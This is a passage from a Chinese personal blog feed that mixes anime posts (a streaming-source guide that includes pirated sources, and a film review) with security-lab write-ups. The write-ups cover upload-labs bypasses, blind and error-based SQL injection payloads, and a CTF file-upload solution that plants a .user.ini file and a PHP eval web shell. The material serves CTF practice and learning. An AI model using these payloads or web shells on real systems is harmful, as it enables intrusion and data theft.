<h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
<h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>如何寻觅动画</title>
    <url>/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</url>
    <content><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p>
<h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol>
<li><strong>bilibili港澳台区</strong><br>优点：</li>
</ol>
<ul>
<li>资源比较多，不用到处找</li>
<li>有弹幕和评论区，有分享的地方</li>
<li>除了独家代理，其它都可以免费观看<br>缺点：</li>
<li>在1080p资源中画质算是比较差的，压缩比较大</li>
<li>字幕样式比较丑，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br>如果能用大陆代理，老番资源还是比较多的，无删改的可以看看，由于经常搞活动，会员价很便宜。<br>(活动)会员价：8刀&#x2F;年<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p>
<ol start="2">
<li><strong>巴哈姆特动画疯</strong><br>优点：</li>
</ol>
<ul>
<li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li>
<li>资源比较多，不用到处找</li>
<li>有弹幕，可以分享</li>
<li>相较于bilibili港澳台大部分画质更佳</li>
<li>很多时候op，ed歌词都有翻译<br>缺点：</li>
<li>会员费较贵</li>
<li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li>
<li>有时字幕过大，略影响观看</li>
<li>老番资源较少</li>
</ul>
<p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br>会员价：36刀&#x2F;年。新年买半年或一年可以加送1个月<br><a href="https://ani.gamer.com.tw/">动画疯</a></p>
<ol start="3">
<li><strong>Netflix</strong><br>优点：</li>
</ol>
<ul>
<li>画质好，没得说</li>
<li>资源也比较多</li>
<li>有自制动画。如：恶魔人，赛博朋克</li>
<li>可以跳过op和ed<br>缺点：</li>
<li>新番资源少</li>
<li>对代理的要求比较高</li>
</ul>
<p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br>(合租)会员价：27刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.netflix.com/">Netflix</a></p>
<ol start="4">
<li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li>
</ol>
<p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br>(合租)会员价：13刀&#x2F;年。不同的店价格可能不同<br><a href="https://www.disneyplus.com/">Disney+</a></p>
<ol start="5">
<li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li>
</ol>
<p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p>
<ol start="6">
<li><strong>YouTube</strong></li>
</ol>
<ul>
<li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p>
<p>还没有看过<strong>神之动画</strong>的快来看！</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p>
<ul>
<li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li>
</ul>
<p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p>
<ol start="7">
<li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p>
<ol start="8">
<li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li>
</ol>
<p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p>
<h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol>
<li><strong>Telegram</strong></li>
</ol>
<ul>
<li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li>
</ul>
<p><a href="https://t.me/AnimeNep">NEP.Anime</a></p>
<ul>
<li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li>
</ul>
<p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p>
<ul>
<li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li>
</ul>
<p><a href="https://t.me/channel_ani">ANI</a></p>
<p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p>
<ol start="2">
<li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li>
</ol>
<p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p>
<p><a href="https://www.agemys.net/">AGE</a></p>
<ol start="3">
<li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li>
</ol>
<p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧，也算是为动画行业添砖加瓦。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)<br>注意本文的时效性：2022.11，后续有任何改变并不知晓。</p>
]]></content>
      <categories>
        <category>动画</category>
        <category>资源</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>资源</tag>
      </tags>
  </entry>
  <entry>
    <title>布尔盲注</title>
    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>

<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>

<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：如果写脚本，采用二分法更佳</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>布尔盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入常用函数</title>
    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
<span id="more"></span>

<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
</ol>
<ul>
<li>XML_document: xml标记</li>
<li>XPath_string: 显示输入语句</li>
<li>new_value: 新值</li>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="2">
<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
</ol>
<ul>
<li>xml:可扩展语言</li>
<li>update():函数更新</li>
<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
</ul>
<ol start="3">
<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
</ol>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
</li>
<li><p>原理</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
</li>
</ol>
<ul>
<li>输出字符长度限制为32个字符</li>
<li>适用版本：5.1.5以上</li>
</ul>
<ol start="3">
<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
</ol>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
<li>格式<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>payload是需要插入sql注入语句的位置</li>
<li>floor():去除小数部分</li>
<li>rand():产生随机数</li>
<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
<li>count():count(*)函数返回表中的记录数</li>
<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
</ul>
<ol start="2">
<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
</li>
<li><p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>报错注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>搖曳露营movie--仰望星空的童话</title>
    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>搖曳露营</category>
      </categories>
      <tags>
        <tag>动画</tag>
        <tag>搖曳露营</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-easyupload</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是打了一点靶场，完全不够，知识还多着呢！</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>尝试<br>首先进行多种尝试，修改php文件名后缀的方法几乎都试过了，无法上传成功。<br>图片木马多次尝试也无法成功。那么只能只能换一种思路。<br>几经波折后，我们发现了几个重要的点：</li>
</ol>
<ul>
<li>如果文件中含有php，那么无法上传成功，所以必须选择没有php的方式。这里可以使用短标签绕过。</li>
<li>即便上传了也无法连接蚁剑。那么我们可以选择尝试.user.ini</li>
</ul>
<p>这里涉及到几个知识：</p>
<ul>
<li><p>短标签<br>通常情况下输出我们会这样写：<br><code>&lt;?php echo &quot;hello&quot;; ?&gt;</code><br>但其实我们可以简写为: <code>&lt;?= &quot;hello&quot;;?&gt;</code></p>
</li>
<li><p>PHP REQUEST</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 中提供了一个 $_REQUEST 全局变量，它是一个包含了 $_POST、$_GET 和 $_COOKIE 的数组，</span><br><span class="line">数组结构与 $_POST 和 $_GET 类似。</span><br><span class="line">也就是说不管是使用 POST 还是使用 GET 方式提交的数据，都可以使用 $_REQUEST 来获取，</span><br><span class="line">甚至可以使用 $_REQUEST 来获取 COOKIE 的信息。在 PHP5.3 中引入 request_order 属性，</span><br><span class="line">我们可以通过在 php.ini 配置文件中修改 request_order 属性的值，来控制 $_REQUEST 中包含的内容。</span><br></pre></td></tr></table></figure>
</li>
<li><p>.user.ini<br>.user.ini:它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br><code>auto_prepend_file=123.gif</code><br>其中123.gif是需要包含的文件，借此我们可以包含任意文件。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">更详细的解释</a></p>
</li>
<li><p>GIF89a<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>示例：<br>在记事本下写下该内容，后缀保存为图片</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span> = <span class="string">&quot;refresh&quot;</span> <span class="attr">content</span> = <span class="string">&quot;1; url=http://www.***.com/&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当单独查看此文件时，会出现GIF89a，然后跳转到指定的网页（ie6和ie7下，Firefox下不可以）<br>php下检测（使用getimagesize函数无法判断其图片是无效的）</p>
</li>
</ul>
<ol start="2">
<li><p>构造条件<br>涉及的知识都清楚后，我们先创建一个.user.ini文件，文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=c.jpg</span><br></pre></td></tr></table></figure>
<p>创建一个c.txt文件，文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后将其后缀改为jpg</p>
</li>
<li><p>抓包修改<br>首先上传.user.ini文件，抓包<br>得到的包将里面的Content-Type改为image&#x2F;jpeg,放包<br>页面应显示： <code>file upload successful, the path is: uploads/.user.ini</code><br>然后上传c.jpg<br>页面应显示： <code>file upload successful, the path is: uploads/c.jpg</code><br>上传成功后便可进行下一步。</p>
</li>
<li><p>蚁剑连接<br>接下来我们打开F12，从Network处查看我们上传的文件地址：<br><code>http://61.147.171.105:56641/uploads/index.php</code><br>找到文件地址后，打开蚁剑连接<br>url地址填写上面的文件地址，连接密码则填写cmd<br>等待几秒，测试连接，一般会显示连接成功。<br>然后添加数据，等待几秒后，右键 文件管理。（有时蚁剑会出小问题，多尝试几次即可）<br>如果没有几个文件，删除重来。如果有很多文件，那么就可以从中找到我们所需的flag</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>慢慢来，不要忽略细节。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_56426046/article/details/126563269">攻防世界ctf题目easyupload做题笔记</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>upload</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-baby_web</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
</li>
<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-fileclude</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含的第一道ctf，之前也没练过，所以不知道怎么做。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>分析代码<br>打开后显示这样一段php：</p>
